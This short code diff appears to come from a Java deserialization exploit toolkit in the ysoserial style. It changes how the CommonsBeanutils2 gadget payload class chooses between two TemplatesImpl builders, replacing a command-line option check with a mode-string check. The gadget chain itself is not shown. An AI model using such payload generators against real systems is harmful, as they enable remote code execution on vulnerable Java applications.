@@ -9,6 +9,7 @@ import org.apache.commons.beanutils.BeanComparator;
 
 import java.util.PriorityQueue;
 
+import static com.qi4l.jndi.Starter.JYsoMode;
 import static com.qi4l.jndi.Starter.cmdLine;
 
 /**
@@ -27,7 +28,7 @@ public class CommonsBeanutils2 implements ObjectPayload<Object> {
 
     public Object getObject(PayloadType type, String... param) throws Exception {
         final Object template;
-        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
+        if (JYsoMode.contains("yso")) {
             template = GadgetsYso.createTemplatesImpl(param[0]);
         } else {
             template = Gadgets.createTemplatesImpl(type, param);
